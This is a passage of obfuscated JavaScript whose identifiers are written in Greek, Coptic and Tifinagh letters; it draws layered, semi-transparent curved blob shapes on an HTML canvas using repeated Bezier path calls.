				Δ.bezierCurveTo(392.1428527832031 * ᐃ, ᐃ * 397.017858505249, 406.1428527832031 * ᐃ, 401.017858505249 * ᐃ, 409.1428527832031 * ᐃ, 418.017858505249 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 410.1428527832031, 426.017858505249 * ᐃ, ᐃ * 401.1428527832031, ᐃ * 425.017858505249, ᐃ * 388.1428527832031, 418.017858505249 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 381.1428527832031, ᐃ * 411.017858505249, ᐃ * 383.1428527832031, ᐃ * 407.017858505249, 385.1428527832031 * ᐃ, ᐃ * 405.017858505249);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ΔⵠⲆΔ;
				Δ.translate(-ⵠⵠⵠᐃ * ᐃ, -ΔⲆΔᐃ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
				Δ.moveTo(385.1428527832031 * ᐃ, ᐃ * 405.017858505249);
				Δ.bezierCurveTo(392.1428527832031 * ᐃ, ᐃ * 397.017858505249, ᐃ * 406.1428527832031, 401.017858505249 * ᐃ, 409.1428527832031 * ᐃ, 418.017858505249 * ᐃ);
				Δ.bezierCurveTo(410.1428527832031 * ᐃ, 426.017858505249 * ᐃ, 401.1428527832031 * ᐃ, 425.017858505249 * ᐃ, 388.1428527832031 * ᐃ, ᐃ * 418.017858505249);
				Δ.bezierCurveTo(ᐃ * 381.1428527832031, ᐃ * 411.017858505249, ᐃ * 383.1428527832031, ᐃ * 407.017858505249, ᐃ * 385.1428527832031, ᐃ * 405.017858505249);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ]);
				Δ.globalAlpha = .5;
				Δ.translate(ⲆᐃΔᐃ * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔⲆΔΔ];
				Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
				Δ.moveTo(ᐃ * 414.1428527832031, ᐃ * 361.4464282989502);
				Δ.bezierCurveTo(418.1428527832031 * ᐃ, ᐃ * 352.4464282989502, 426.1428527832031 * ᐃ, ᐃ * 353.4464282989502, ᐃ * 437.1428527832031, 362.4464282989502 * ᐃ);
				Δ.bezierCurveTo(441.1428527832031 * ᐃ, 366.4464282989502 * ᐃ, 439.1428527832031 * ᐃ, ᐃ * 373.4464282989502, 428.1428527832031 * ᐃ, 372.4464282989502 * ᐃ);
				Δ.bezierCurveTo(416.1428527832031 * ᐃ, 370.4464282989502 * ᐃ, ᐃ * 412.1428527832031, ᐃ * 367.4464282989502, 415.1428527832031 * ᐃ, 361.4464282989502 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ]);
				Δ.globalAlpha = 1;
				Δ.translate(-3 * ᐃ, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
				Δ.lineJoin = ⵠ[ᐃΔΔΔ];
				Δ.moveTo(ᐃ * 414.1428527832031, 361.4464282989502 * ᐃ);
				Δ.bezierCurveTo(418.1428527832031 * ᐃ, 352.4464282989502 * ᐃ, ᐃ * 426.1428527832031, 353.4464282989502 * ᐃ, ᐃ * 437.1428527832031, ᐃ * 362.4464282989502);
				Δ.bezierCurveTo(ᐃ * 441.1428527832031, ᐃ * 366.4464282989502, ᐃ * 439.1428527832031, ᐃ * 373.4464282989502, 428.1428527832031 * ᐃ, ᐃ * 372.4464282989502);
				Δ.bezierCurveTo(ᐃ * 416.1428527832031, 370.4464282989502 * ᐃ, ᐃ * 412.1428527832031, 367.4464282989502 * ᐃ, 415.1428527832031 * ᐃ, 361.4464282989502 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(Δⵠᐃⵠ * ᐃ, ᐃ * ⲆᐃΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 453.1428527832031, ᐃ * 356.875);
				Δ.bezierCurveTo(458.1428527832031 * ᐃ, 363.875 * ᐃ, 447.1428527832031 * ᐃ, 373.875 * ᐃ, ᐃ * 444.1428527832031, 369.875 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 441.1428527832031, ᐃ * 361.875, ᐃ * 448.1428527832031, 352.875 * ᐃ, 453.1428527832031 * ᐃ, 356.875 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ]);
				Δ.globalAlpha = ⵠⲆΔ;
				Δ.translate(ᐃ * -3, -3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
				Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
				Δ.moveTo(ᐃ * 453.1428527832031, ᐃ * 356.875);
				Δ.bezierCurveTo(ᐃ * 458.1428527832031, 363.875 * ᐃ, 447.1428527832031 * ᐃ, 373.875 * ᐃ, 444.1428527832031 * ᐃ, 369.875 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 441.1428527832031, 361.875 * ᐃ, 448.1428527832031 * ᐃ, 352.875 * ᐃ, ᐃ * 453.1428527832031, ᐃ * 356.875);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ΔⲆᐃⲆ * ᐃ, ᐃ * ΔᐃⲆΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
				Δ.moveTo(ᐃ * 40.142852783203125, 225.1607151031494 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 52.142852783203125, 224.1607151031494 * ᐃ, 44.142852783203125 * ᐃ, ᐃ * 251.1607151031494, 36.142852783203125 * ᐃ, 248.1607151031494 * ᐃ);
				Δ.bezierCurveTo(25.142852783203125 * ᐃ, 245.1607151031494 * ᐃ, 34.142852783203125 * ᐃ, 225.1607151031494 * ᐃ, ᐃ * 41.142852783203125, ᐃ * 225.1607151031494);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -3, ᐃ * -ΔΔᐃΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
				Δ.moveTo(40.142852783203125 * ᐃ, ᐃ * 225.1607151031494);
				Δ.bezierCurveTo(ᐃ * 52.142852783203125, 224.1607151031494 * ᐃ, 44.142852783203125 * ᐃ, 251.1607151031494 * ᐃ, 36.142852783203125 * ᐃ, ᐃ * 248.1607151031494);
				Δ.bezierCurveTo(ᐃ * 25.142852783203125, ᐃ * 245.1607151031494, 34.142852783203125 * ᐃ, ᐃ * 225.1607151031494, 41.142852783203125 * ᐃ, ᐃ * 225.1607151031494);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔΔ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃᐃⲆⲆ * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
				Δ.moveTo(114.14285278320312 * ᐃ, ᐃ * 52.4464111328125);
				Δ.bezierCurveTo(ᐃ * 123.14285278320312, ᐃ * 57.4464111328125, ᐃ * 111.14285278320312, ᐃ * 71.4464111328125, ᐃ * 106.14285278320312, ᐃ * 65.4464111328125);
				Δ.bezierCurveTo(ᐃ * 101.14285278320312, 58.4464111328125 * ᐃ, 111.14285278320312 * ᐃ, ᐃ * 51.4464111328125, 114.14285278320312 * ᐃ, ᐃ * 52.4464111328125);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -ᐃⵠⲆΔᐃ, -ⵠⵠⵠᐃ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
				Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
				Δ.moveTo(114.14285278320312 * ᐃ, ᐃ * 52.4464111328125);
				Δ.bezierCurveTo(ᐃ * 123.14285278320312, ᐃ * 57.4464111328125, 111.14285278320312 * ᐃ, 71.4464111328125 * ᐃ, ᐃ * 106.14285278320312, 65.4464111328125 * ᐃ);
				Δ.bezierCurveTo(101.14285278320312 * ᐃ, ᐃ * 58.4464111328125, ᐃ * 111.14285278320312, ᐃ * 51.4464111328125, 114.14285278320312 * ᐃ, 52.4464111328125 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
				Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
				Δ.moveTo(ᐃ * 35.142852783203125, ᐃ * 256.3035707473755);
				Δ.bezierCurveTo(ᐃ * 41.142852783203125, ᐃ * 263.3035707473755, ᐃ * 32.142852783203125, ᐃ * 270.3035707473755, 27.142852783203125 * ᐃ, 270.3035707473755 * ᐃ);
				Δ.bezierCurveTo(20.142852783203125 * ᐃ, ᐃ * 267.3035707473755, ᐃ * 29.142852783203125, 252.3035707473755 * ᐃ, 35.142852783203125 * ᐃ, 255.3035707473755 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -3, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 35.142852783203125, ᐃ * 256.3035707473755);
				Δ.bezierCurveTo(41.142852783203125 * ᐃ, ᐃ * 263.3035707473755, 32.142852783203125 * ᐃ, ᐃ * 270.3035707473755, ᐃ * 27.142852783203125, 270.3035707473755 * ᐃ);
				Δ.bezierCurveTo(20.142852783203125 * ᐃ, 267.3035707473755 * ᐃ, 29.142852783203125 * ᐃ, 252.3035707473755 * ᐃ, 35.142852783203125 * ᐃ, ᐃ * 255.3035707473755);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, ᐃ * ⲆᐃΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠΔΔ];
				Δ.lineJoin = ⵠ[ᐃΔΔΔ];
				Δ.moveTo(48.142852783203125 * ᐃ, ᐃ * 266.4464282989502);
				Δ.bezierCurveTo(ᐃ * 59.142852783203125, 273.4464282989502 * ᐃ, ᐃ * 41.142852783203125, ᐃ * 290.4464282989502, 33.142852783203125 * ᐃ, ᐃ * 285.4464282989502);
				Δ.bezierCurveTo(ᐃ * 25.142852783203125, ᐃ * 277.4464282989502, ᐃ * 44.142852783203125, 261.4464282989502 * ᐃ, 48.142852783203125 * ᐃ, 266.4464282989502 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ⵠᐃⵠΔ;
				Δ.translate(ᐃ * -ΔⲆΔᐃ, ᐃ * -ᐃᐃⲆⲆ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
				Δ.moveTo(ᐃ * 48.142852783203125, 266.4464282989502 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 59.142852783203125, ᐃ * 273.4464282989502, 41.142852783203125 * ᐃ, 290.4464282989502 * ᐃ, ᐃ * 33.142852783203125, 285.4464282989502 * ᐃ);
				Δ.bezierCurveTo(25.142852783203125 * ᐃ, 277.4464282989502 * ᐃ, ᐃ * 44.142852783203125, ᐃ * 261.4464282989502, 48.142852783203125 * ᐃ, ᐃ * 266.4464282989502);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔΔᐃⲆ];
				Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
				Δ.moveTo(138.14285278320312 * ᐃ, ᐃ * 385.5892868041992);
				Δ.bezierCurveTo(150.14285278320312 * ᐃ, ᐃ * 387.5892868041992, ᐃ * 140.14285278320312, ᐃ * 405.5892868041992, ᐃ * 131.14285278320312, ᐃ * 402.5892868041992);
				Δ.bezierCurveTo(ᐃ * 125.14285278320312, ᐃ * 397.5892868041992, 134.14285278320312 * ᐃ, ᐃ * 385.5892868041992, ᐃ * 138.14285278320312, ᐃ * 385.5892868041992);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -ⵠΔΔΔΔ, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 138.14285278320312, 385.5892868041992 * ᐃ);
				Δ.bezierCurveTo(150.14285278320312 * ᐃ, 387.5892868041992 * ᐃ, 140.14285278320312 * ᐃ, 405.5892868041992 * ᐃ, 131.14285278320312 * ᐃ, 402.5892868041992 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 125.14285278320312, ᐃ * 397.5892868041992, 134.14285278320312 * ᐃ, ᐃ * 385.5892868041992, 138.14285278320312 * ᐃ, 385.5892868041992 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⵠ]);
				Δ.globalAlpha = .5;
				Δ.translate(ΔⲆΔᐃ * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
				Δ.moveTo(ᐃ * 218.14285278320312, 394.16071701049805 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 224.14285278320312, ᐃ * 398.16071701049805, 222.14285278320312 * ᐃ, ᐃ * 403.16071701049805, 214.14285278320312 * ᐃ, 407.16071701049805 * ᐃ);
				Δ.bezierCurveTo(204.14285278320312 * ᐃ, ᐃ * 407.16071701049805, 213.14285278320312 * ᐃ, ᐃ * 392.16071701049805, 218.14285278320312 * ᐃ, 394.16071701049805 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ᐃᐃⵠ;
				Δ.translate(-ⵠⵠⵠᐃ * ᐃ, -3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(218.14285278320312 * ᐃ, ᐃ * 394.16071701049805);
				Δ.bezierCurveTo(224.14285278320312 * ᐃ, 398.16071701049805 * ᐃ, ᐃ * 222.14285278320312, ᐃ * 403.16071701049805, 214.14285278320312 * ᐃ, ᐃ * 407.16071701049805);
				Δ.bezierCurveTo(ᐃ * 204.14285278320312, ᐃ * 407.16071701049805, 213.14285278320312 * ᐃ, 392.16071701049805 * ᐃ, ᐃ * 218.14285278320312, ᐃ * 394.16071701049805);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ]);
				Δ.translate(50 * ᐃ, ᐃ * 100)
			} else {
				Ⲇⵠ.width = ᐃ * 543;
				Ⲇⵠ.height = 470 * ᐃ;
				Δ.globalAlpha = .5;
				Δ.translate(Δⵠᐃⵠ * ᐃ, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
				Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
				Δ.moveTo(ᐃ * 97.14285278320312, 113.875 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 104.14285278320312, ᐃ * 106.875, ᐃ * 113.14285278320312, ᐃ * 109.875, ᐃ * 118.14285278320312, ᐃ * 118.875);
				Δ.bezierCurveTo(119.14285278320312 * ᐃ, ᐃ * 121.875, ᐃ * 118.14285278320312, 129.875 * ᐃ, 103.14285278320312 * ᐃ, 124.875 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 94.14285278320312, 120.875 * ᐃ, 95.14285278320312 * ᐃ, 117.875 * ᐃ, ᐃ * 97.14285278320312, ᐃ * 113.875);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ⵠΔΔ;
				Δ.translate(-ᐃᐃⵠⲆᐃ * ᐃ, -ⵠᐃⵠⲆ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 97.14285278320312, ᐃ * 113.875);
				Δ.bezierCurveTo(104.14285278320312 * ᐃ, 106.875 * ᐃ, ᐃ * 113.14285278320312, 109.875 * ᐃ, ᐃ * 118.14285278320312, 118.875 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 119.14285278320312, 121.875 * ᐃ, 118.14285278320312 * ᐃ, 129.875 * ᐃ, 103.14285278320312 * ᐃ, ᐃ * 124.875);
				Δ.bezierCurveTo(94.14285278320312 * ᐃ, 120.875 * ᐃ, 95.14285278320312 * ᐃ, ᐃ * 117.875, ᐃ * 97.14285278320312, 113.875 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
				Δ.moveTo(ᐃ * 88.14285278320312, ᐃ * 138.87498474121094);
				Δ.bezierCurveTo(90.14285278320312 * ᐃ, 128.87498474121094 * ᐃ, ᐃ * 104.14285278320312, ᐃ * 130.87498474121094, ᐃ * 107.14285278320312, 138.87498474121094 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 109.14285278320312, 147.87498474121094 * ᐃ, 89.14285278320312 * ᐃ, ᐃ * 145.87498474121094, 88.14285278320312 * ᐃ, ᐃ * 138.87498474121094);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ΔⵠΔⵠ;
				Δ.translate(-3 * ᐃ, -Δⵠᐃⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔΔᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 88.14285278320312, 138.87498474121094 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 90.14285278320312, ᐃ * 128.87498474121094, 104.14285278320312 * ᐃ, 130.87498474121094 * ᐃ, ᐃ * 107.14285278320312, 138.87498474121094 * ᐃ);
				Δ.bezierCurveTo(109.14285278320312 * ᐃ, 147.87498474121094 * ᐃ, ᐃ * 89.14285278320312, 145.87498474121094 * ᐃ, 88.14285278320312 * ᐃ, ᐃ * 138.87498474121094);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, ⵠⲆΔⵠΔ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
				Δ.moveTo(194.14285278320312 * ᐃ, ᐃ * 44.87498474121094);
				Δ.bezierCurveTo(202.14285278320312 * ᐃ, ᐃ * 49.87498474121094, ᐃ * 195.14285278320312, 62.87498474121094 * ᐃ, ᐃ * 187.14285278320312, ᐃ * 60.87498474121094);
				Δ.bezierCurveTo(ᐃ * 180.14285278320312, ᐃ * 57.87498474121094, ᐃ * 190.14285278320312, 40.87498474121094 * ᐃ, ᐃ * 194.14285278320312, 44.87498474121094 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(-ⲆⲆΔⲆ * ᐃ, -3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
				Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
				Δ.moveTo(194.14285278320312 * ᐃ, 44.87498474121094 * ᐃ);
				Δ.bezierCurveTo(202.14285278320312 * ᐃ, 49.87498474121094 * ᐃ, 195.14285278320312 * ᐃ, ᐃ * 62.87498474121094, ᐃ * 187.14285278320312, ᐃ * 60.87498474121094);
				Δ.bezierCurveTo(ᐃ * 180.14285278320312, ᐃ * 57.87498474121094, ᐃ * 190.14285278320312, ᐃ * 40.87498474121094, ᐃ * 194.14285278320312, 44.87498474121094 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * ΔⲆΔᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔΔ];
				Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
				Δ.moveTo(ᐃ * 22.142852783203125, ᐃ * 218.44642639160156);
				Δ.bezierCurveTo(ᐃ * 31.142852783203125, ᐃ * 205.44642639160156, ᐃ * 49.142852783203125, 221.44642639160156 * ᐃ, ᐃ * 49.142852783203125, 230.44642639160156 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 44.142852783203125, ᐃ * 243.44642639160156, 14.142852783203125 * ᐃ, 228.44642639160156 * ᐃ, ᐃ * 22.142852783203125, ᐃ * 218.44642639160156);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
				Δ.globalAlpha = ᐃᐃⲆΔ;
				Δ.translate(ᐃ * -3, -3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔΔᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 22.142852783203125, 218.44642639160156 * ᐃ);
				Δ.bezierCurveTo(31.142852783203125 * ᐃ, ᐃ * 205.44642639160156, ᐃ * 49.142852783203125, ᐃ * 221.44642639160156, ᐃ * 49.142852783203125, ᐃ * 230.44642639160156);
				Δ.bezierCurveTo(ᐃ * 44.142852783203125, 243.44642639160156 * ᐃ, 14.142852783203125 * ᐃ, 228.44642639160156 * ᐃ, 22.142852783203125 * ᐃ, 218.44642639160156 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃⵠⲆΔᐃ * ᐃ, ᐃ * ᐃⵠⲆΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠΔΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(41.142852783203125 * ᐃ, 249.875 * ᐃ);
				Δ.bezierCurveTo(33.142852783203125 * ᐃ, ᐃ * 255.875, ᐃ * 30.142852783203125, ᐃ * 265.875, 40.142852783203125 * ᐃ, 266.875 * ᐃ);
				Δ.bezierCurveTo(49.142852783203125 * ᐃ, 261.875 * ᐃ, 53.142852783203125 * ᐃ, ᐃ * 244.875, 41.142852783203125 * ᐃ, 249.875 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ]);
				Δ.globalAlpha = ⵠΔⲆ;
				Δ.translate(ᐃ * -ᐃⲆᐃᐃ, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔΔᐃⲆ];
				Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
				Δ.moveTo(ᐃ * 41.142852783203125, ᐃ * 249.875);
				Δ.bezierCurveTo(ᐃ * 33.142852783203125, 255.875 * ᐃ, ᐃ * 30.142852783203125, ᐃ * 265.875, ᐃ * 40.142852783203125, ᐃ * 266.875);
				Δ.bezierCurveTo(49.142852783203125 * ᐃ, 261.875 * ᐃ, 53.142852783203125 * ᐃ, ᐃ * 244.875, 41.142852783203125 * ᐃ, 249.875 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ᐃ * ΔⲆᐃⲆ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
				Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
				Δ.moveTo(ᐃ * 105.14285278320312, ᐃ * 369.875);
				Δ.bezierCurveTo(92.14285278320312 * ᐃ, ᐃ * 361.875, ᐃ * 77.14285278320312, ᐃ * 375.875, ᐃ * 79.14285278320312, ᐃ * 384.875);
				Δ.bezierCurveTo(ᐃ * 84.14285278320312, ᐃ * 399.875, ᐃ * 114.14285278320312, 375.875 * ᐃ, ᐃ * 104.14285278320312, 369.875 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ]);
				Δ.globalAlpha = ⵠⲆΔ;
				Δ.translate(ᐃ * -Δⵠᐃⵠ, ᐃ * -ⵠⵠⵠⵠ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(105.14285278320312 * ᐃ, 369.875 * ᐃ);
				Δ.bezierCurveTo(92.14285278320312 * ᐃ, ᐃ * 361.875, ᐃ * 77.14285278320312, ᐃ * 375.875, 79.14285278320312 * ᐃ, ᐃ * 384.875);
				Δ.bezierCurveTo(84.14285278320312 * ᐃ, 399.875 * ᐃ, ᐃ * 114.14285278320312, 375.875 * ᐃ, 104.14285278320312 * ᐃ, ᐃ * 369.875);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ⲆΔⵠⵠ * ᐃ, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 233.14285278320312, 43.4464111328125 * ᐃ);
				Δ.bezierCurveTo(238.14285278320312 * ᐃ, 47.4464111328125 * ᐃ, 222.14285278320312 * ᐃ, 73.4464111328125 * ᐃ, ᐃ * 214.14285278320312, ᐃ * 58.4464111328125);
				Δ.bezierCurveTo(ᐃ * 211.14285278320312, ᐃ * 48.4464111328125, ᐃ * 230.14285278320312, 35.4464111328125 * ᐃ, 233.14285278320312 * ᐃ, 42.4464111328125 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ⵠΔᐃ;
				Δ.translate(ᐃ * -3, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⲆΔΔᐃ];
				Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
				Δ.moveTo(233.14285278320312 * ᐃ, 43.4464111328125 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 238.14285278320312, 47.4464111328125 * ᐃ, ᐃ * 222.14285278320312, 73.4464111328125 * ᐃ, ᐃ * 214.14285278320312, ᐃ * 58.4464111328125);
				Δ.bezierCurveTo(211.14285278320312 * ᐃ, 48.4464111328125 * ᐃ, 230.14285278320312 * ᐃ, ᐃ * 35.4464111328125, ᐃ * 233.14285278320312, ᐃ * 42.4464111328125);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * Δⵠᐃⵠ, ΔⲆᐃⲆ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
				Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
				Δ.moveTo(371.1428527832031 * ᐃ, 34.73213195800781 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 378.1428527832031, 20.732131958007812 * ᐃ, ᐃ * 395.1428527832031, ᐃ * 32.73213195800781, ᐃ * 396.1428527832031, ᐃ * 42.73213195800781);
				Δ.bezierCurveTo(399.1428527832031 * ᐃ, ᐃ * 59.73213195800781, 369.1428527832031 * ᐃ, 43.73213195800781 * ᐃ, ᐃ * 372.1428527832031, ᐃ * 34.73213195800781);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -3, -ΔᐃⲆΔ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
				Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
				Δ.moveTo(371.1428527832031 * ᐃ, ᐃ * 34.73213195800781);
				Δ.bezierCurveTo(ᐃ * 378.1428527832031, ᐃ * 20.732131958007812, 395.1428527832031 * ᐃ, ᐃ * 32.73213195800781, 396.1428527832031 * ᐃ, ᐃ * 42.73213195800781);
				Δ.bezierCurveTo(ᐃ * 399.1428527832031, ᐃ * 59.73213195800781, 369.1428527832031 * ᐃ, 43.73213195800781 * ᐃ, ᐃ * 372.1428527832031, 34.73213195800781 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, ᐃⲆᐃᐃ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 117.14285278320312, 392.5892868041992 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 115.14285278320312, ᐃ * 384.5892868041992, ᐃ * 109.14285278320312, 383.5892868041992 * ᐃ, ᐃ * 103.14285278320312, ᐃ * 384.5892868041992);
